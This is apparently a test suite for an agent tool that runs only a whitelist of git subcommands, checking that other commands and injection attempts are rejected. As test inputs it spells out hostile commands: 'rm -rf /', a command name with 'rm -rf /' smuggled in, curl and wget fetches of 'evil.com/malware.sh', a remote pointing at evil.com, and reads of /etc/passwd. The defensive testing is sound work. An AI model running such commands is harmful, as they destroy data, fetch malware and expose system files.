/**
 * Tests for agents/bash-executor/index.mjs
 *
 * Function signatures:
 * - default export: executeSafeShellCommands({ commands }): Execute git commands safely
 *
 * NOTE: Tests avoid actual git command execution where possible.
 * Tests focus on input validation and module structure.
 */

import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { rm } from "node:fs/promises";
import { createTempDir } from "../../setup/test-utils.mjs";

describe("bash-executor", () => {
  let tempDir;

  beforeEach(async () => {
    const temp = await createTempDir();
    tempDir = temp.path;
  });

  afterEach(async () => {
    if (tempDir) {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  // ==================== Happy Path ====================
  describe("Happy Path", () => {
    describe("module exports", () => {
      test("should export default function", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        expect(bashExecutor.default).toBeDefined();
        expect(typeof bashExecutor.default).toBe("function");
      });

      test("should have description property", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        expect(bashExecutor.default.description).toBeDefined();
        expect(typeof bashExecutor.default.description).toBe("string");
      });

      test("should have input_schema property", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        expect(bashExecutor.default.input_schema).toBeDefined();
        expect(bashExecutor.default.input_schema.type).toBe("object");
      });

      test("should have output_schema property", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        expect(bashExecutor.default.output_schema).toBeDefined();
        expect(bashExecutor.default.output_schema.type).toBe("object");
      });
    });

    describe("input_schema structure", () => {
      test("should require commands property", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const schema = bashExecutor.default.input_schema;
        expect(schema.required).toContain("commands");
      });

      test("should define commands as array", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const schema = bashExecutor.default.input_schema;
        expect(schema.properties.commands.type).toBe("array");
      });

      test("should restrict command to git only", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const schema = bashExecutor.default.input_schema;
        const commandEnum = schema.properties.commands.items.properties.command.enum;
        expect(commandEnum).toEqual(["git"]);
      });
    });

    describe("output_schema structure", () => {
      test("should require success and results", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const schema = bashExecutor.default.output_schema;
        expect(schema.required).toContain("success");
        expect(schema.required).toContain("results");
      });

      test("should define results as array", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const schema = bashExecutor.default.output_schema;
        expect(schema.properties.results.type).toBe("array");
      });
    });

    describe("description content", () => {
      test("should mention git commands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        expect(bashExecutor.default.description.toLowerCase()).toContain("git");
      });

      test("should mention supported subcommands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const desc = bashExecutor.default.description.toLowerCase();
        expect(desc).toContain("init");
        expect(desc).toContain("clone");
        expect(desc).toContain("commit");
      });
    });
  });

  // ==================== Unhappy Path ====================
  describe("Unhappy Path", () => {
    describe("input validation", () => {
      test("should reject non-array commands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({ commands: "not-array" });
        expect(result.success).toBe(false);
        expect(result.error).toContain("array");
      });

      test("should reject empty commands array", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({ commands: [] });
        expect(result.success).toBe(false);
        expect(result.error).toContain("empty");
      });

      test("should reject null commands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({ commands: null });
        expect(result.success).toBe(false);
      });

      test("should reject undefined commands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({ commands: undefined });
        expect(result.success).toBe(false);
      });
    });

    describe("command validation", () => {
      test("should reject non-git commands", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "ls", args: ["-la"] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("Unsupported command");
      });

      test("should reject bash command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "bash", args: ["-c", "echo test"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject rm command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "rm", args: ["-rf", "/"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject empty command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "", args: [] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("git subcommand validation", () => {
      test("should reject unsupported git subcommand", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["push", "origin", "main"] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("Unsupported git subcommand");
      });

      test("should reject git reset command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["reset", "--hard"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git without subcommand", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: [] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("subcommand");
      });
    });
  });

  // ==================== Critical Error Scenarios ====================
  describe("Critical Error Scenarios", () => {
    describe("dangerous command prevention", () => {
      test("should prevent git push (data exfiltration)", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["push", "--force", "origin", "main"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should prevent git remote add", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [
            {
              command: "git",
              args: ["remote", "add", "evil", "https://evil.com/repo"],
            },
          ],
        });
        expect(result.success).toBe(false);
      });

      test("should prevent git rebase", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["rebase", "-i", "HEAD~5"] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("batch execution behavior", () => {
      test("should stop on first failure", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [
            { command: "invalid", args: [] },
            { command: "git", args: ["status"] },
          ],
        });
        // Should only have one result since first command failed
        expect(result.results.length).toBe(1);
      });

      test("should report correct counts on failure", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "not-git", args: ["test"] }],
        });
        expect(result.failed).toBe(1);
        expect(result.succeeded).toBe(0);
      });

      test("should return all required fields in result", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["unsupported"] }],
        });
        expect(result).toHaveProperty("success");
        expect(result).toHaveProperty("results");
        expect(result.results[0]).toHaveProperty("command");
        expect(result.results[0]).toHaveProperty("output");
        expect(result.results[0]).toHaveProperty("error");
      });
    });

    describe("result structure", () => {
      test("should include command string in result", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["bad-subcommand"] }],
        });
        expect(result.results[0].command).toContain("git");
        expect(result.results[0].command).toContain("bad-subcommand");
      });

      test("should provide total count", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "ls", args: [] }],
        });
        expect(typeof result.total).toBe("number");
      });
    });
  });

  // ==================== Security Scenarios ====================
  describe("Security Scenarios", () => {
    describe("command injection prevention", () => {
      test("should reject shell metacharacters in command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git; rm -rf /", args: [] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject pipe operator in args", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["status", "|", "cat", "/etc/passwd"] }],
        });
        // Command goes through as git status with extra args
        // The pipe is treated as literal arg, not shell operator
        expect(result.results[0]).toBeDefined();
      });

      test("should not execute shell substitution", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["log", "--oneline", "$(whoami)"] }],
        });
        // Should treat $(whoami) as literal string, not execute
        expect(result.results[0]).toBeDefined();
      });

      test("should not execute backtick substitution", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["log", "`id`"] }],
        });
        expect(result.results[0]).toBeDefined();
      });
    });

    describe("path traversal prevention", () => {
      test("should handle path traversal in clone URL", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["clone", "file:///etc/passwd", "."] }],
        });
        // Clone is allowed but the file protocol is git's concern
        expect(result.results[0]).toBeDefined();
      });

      test("should handle .. in args", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["add", "../../../etc/passwd"] }],
        });
        // Git handles the path, not shell
        expect(result.results[0]).toBeDefined();
      });
    });

    describe("environment and system protection", () => {
      test("should not allow curl command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "curl", args: ["https://evil.com/malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow wget command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "wget", args: ["https://evil.com/malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow chmod command", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "chmod", args: ["+x", "malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow eval in any form", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "eval", args: ["rm -rf /"] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("git-specific security", () => {
      test("should reject git gc (can corrupt repo)", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["gc", "--aggressive"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git filter-branch (rewrites history)", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [
            {
              command: "git",
              args: ["filter-branch", "--force", "--all"],
            },
          ],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git reflog (exposes sensitive history)", async () => {
        const bashExecutor = await import("../../../agents/bash-executor/index.mjs");
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["reflog", "expire", "--all"] }],
        });
        expect(result.success).toBe(false);
      });
    });
  });
});
